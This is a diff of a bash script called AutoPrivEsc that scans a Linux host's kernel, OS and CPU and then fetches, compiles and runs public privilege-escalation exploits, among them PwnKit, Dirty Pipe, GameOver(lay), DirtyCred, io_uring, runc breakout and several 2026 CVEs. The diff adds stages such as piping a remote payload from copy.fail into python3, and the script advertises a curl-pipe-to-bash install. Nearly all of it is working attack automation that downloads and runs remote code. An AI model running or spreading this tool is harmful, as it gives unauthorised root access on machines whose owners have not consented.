@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# AutoPrivEsc - Scan -> Match -> Exploit
+# Thiscitze AutoPrivEsc - Scan -> Match -> Exploit
 # Kullanim: curl -fsSL <RAW_URL> | bash
 # ============================================
 
@@ -18,10 +18,11 @@ done
 
 # ===== BANNER =====
 echo -e "${RED}"
-echo "  ___        __  ___      _       _ ___  ___  ___ "
-echo " / _ \      / / | _ \_ _ (_)_ __| | __|/ __|/ __|"
-echo "| (_) |  _ / _ \|  _/ '_|| | '__| | _| \__ \ (__ "
-echo " \___/  (_)_/ \_\_| |_|  |_|_|  |_|___||___/\___|"
+echo "   _____ _  _   ___   _____  _____  _   ___ ___ ___"
+echo "  |_   _| || | / _ \ |_   _||__  / | | | __| _ \ __|"
+echo "    | | | || || (_) |  | |    / /  | |_| _||   / _| "
+echo "    |_| |_||_| \___/   |_|   /___|  \___/___|_|_\___|"
+echo "         AutoPrivEsc - Scan -> Match -> Exploit"
 echo -e "${NC}"
 echo -e "${YELLOW}[*] Scanning system...${NC}"
 echo ""
@@ -85,10 +86,28 @@ if [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ]; then
     run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn"
 fi
 
+# --- PwnKit alt (Rvn0xsy) ---
+if [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ]; then
+    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (alt POC)"
+    run "git clone -q https://github.com/Rvn0xsy/CVE-2021-4034 rvn && cd rvn && gcc cve-2021-4034.c -o exp && ./exp"
+fi
+
 # --- Dirty Pipe (CVE-2022-0847) ---
 if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 8 ] && [ "$KERNEL_MIN" -le 16 ]; then
     echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-0847 (Dirty Pipe)"
     run "git clone -q https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git dp && cd dp && gcc exploit.c -o exploit && ./exploit"
+fi
+
+# --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
+if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
+    echo -e "${GREEN}[+] Ubuntu + OverlayFS${NC} -> CVE-2023-2640 + CVE-2023-32629"
+    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && ./gameover.sh"
+fi
+
+# --- DirtyCred ---
+if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 14 ] || [ "$KERNEL_MAJ" = "6" ]; then
+    echo -e "${GREEN}[+] Kernel 5.14-6.x ${NC}-> DirtyCred"
+    run "git clone -q https://github.com/PR0fix/DirtyCred.git dc && cd dc && make && ./exploit"
 fi
 
 # --- DirtyFrag ---
@@ -103,10 +122,34 @@ if ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 19 ] ) || ( [ "$KERNEL_MAJ" 
     run "git clone -q https://github.com/v12-security/pocs.git pocs && cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp"
 fi
 
-# --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
-if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
-    echo -e "${GREEN}[+] Ubuntu + OverlayFS${NC} -> CVE-2023-2640 + CVE-2023-32629"
-    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && ./gameover.sh"
+# --- eBPF Ring Buffer / Verifier LPE ---
+echo -e "${YELLOW}[~] Trying eBPF LPE${NC}"
+run "git clone -q https://github.com/argonsecurity/ebpf-lpe-poc.git ebpf && cd ebpf && make && ./exploit"
+
+# --- Netfilter / nf_tables (CVE-2023-32233) ---
+echo -e "${YELLOW}[~] Trying nftables (CVE-2023-32233)${NC}"
+run "git clone -q https://github.com/bluefrostsecurity/CVE-2023-32233-PoC.git nft && cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit"
+
+# --- SLUB Overflow (CVE-2022-29582) ---
+if [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 10 ] && [ "$KERNEL_MIN" -le 17 ]; then
+    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-29582 (SLUB)"
+    run "git clone -q https://github.com/Bonfee/CVE-2022-29582.git slub && cd slub && gcc -O2 exploit.c -o exploit && ./exploit"
+fi
+
+# --- io_uring UAF ---
+echo -e "${YELLOW}[~] Trying io_uring LPE${NC}"
+run "git clone -q https://github.com/kxcode/iouring-exploit-poc.git iou && cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit"
+
+# --- TONTOU (Spectre v2 bypass, AMD Zen 2) ---
+if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
+    echo -e "${YELLOW}[~] AMD Zen 2${NC} -> TONTOU"
+    run "wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou"
+fi
+
+# --- CVE-2026-46215 ---
+if [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null; then
+    echo -e "${YELLOW}[~] Kernel $KERNEL.x${NC} -> CVE-2026-46215"
+    run "git clone -q https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git c46215 && cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit"
 fi
 
 # --- PackageKit (CVE-2026-41651) ---
@@ -121,31 +164,14 @@ if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
     run "git clone -q https://github.com/cybersecurityworks/CVE-2021-3560-Exploit-POC.git p3560 && cd p3560 && python3 cve-2021-3560.py"
 fi
 
-# --- SSH keysign ---
-if [ -f "/usr/lib/ssh/ssh-keysign" ]; then
-    SSH_KEY=$(stat -c "%a" /usr/lib/ssh/ssh-keysign 2>/dev/null)
-    if [ -n "$SSH_KEY" ] && [ "$SSH_KEY" -ge 4000 ] 2>/dev/null; then
-        echo -e "${GREEN}[+] ssh-keysign SUID${NC} -> ssh-keysign-pwn"
-        run "git clone -q https://github.com/0xdeadbeefnetwork/ssh-keysign-pwn.git sk && cd sk && python3 main.py"
-    fi
-fi
+# --- runc Container Breakout (CVE-2024-21626) ---
+echo -e "${YELLOW}[~] Trying runc breakout (CVE-2024-21626)${NC}"
+run "git clone -q https://github.com/snyk/CVE-2024-21626-PoC.git runc && cd runc && ./exploit.sh"
 
 # --- OVSwrap ---
 if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
     echo -e "${GREEN}[+] Open vSwitch loaded${NC} -> OVSwrap"
     run "git clone -q https://github.com/manizada/OVSwrap.git ovs && cd ovs && python3 ovswrap-poc.py"
-fi
-
-# --- TONTOU ---
-if echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
-    echo -e "${YELLOW}[~] AMD Zen 2${NC} -> TONTOU"
-    run "wget -q https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -O tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou"
-fi
-
-# --- CVE-2026-46215 ---
-if [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null; then
-    echo -e "${YELLOW}[~] Kernel $KERNEL.x${NC} -> CVE-2026-46215"
-    run "git clone -q https://github.com/bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable.git c46215 && cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit"
 fi
 
 # --- CVE-2026-31431 ---
@@ -160,8 +186,19 @@ run "git clone -q https://github.com/ExploitEoom/CVE-2026-46300.git c46300 && cd
 echo -e "${YELLOW}[~] Trying CVE-2026-64600${NC}"
 run "git clone -q https://github.com/Debajyoti0-0/CVE-2026-64600.git c64600 && cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600"
 
+# --- CVE-2026-68138 ---
+echo -e "${YELLOW}[~] Trying CVE-2026-68138${NC}"
+run "git clone -q https://github.com/aramosf/CVE-2026-68138.git c68138 && cd c68138 && ./build.sh && ./build/exploit"
+
+# --- CVE-2026-68398 ---
+echo -e "${YELLOW}[~] Trying CVE-2026-68398${NC}"
+run "git clone -q https://github.com/aramosf/cve-2026-68398.git c68398 && cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit"
+
+# --- copy.fail exp ---
+echo -e "${YELLOW}[~] Trying copy.fail exp${NC}"
+run "curl https://copy.fail/exp | python3 && su"
+
 # ===== RESULT =====
 echo "================================================"
-echo -e "${RED}[-] No exploit succeeded. Running LinPEAS...${NC}"
-echo ""
-curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+echo -e "${RED}[-] No exploit succeeded.${NC}"
+echo -e "${RED}[-] Done. Clean up: rm -rf /tmp/apex${NC}"
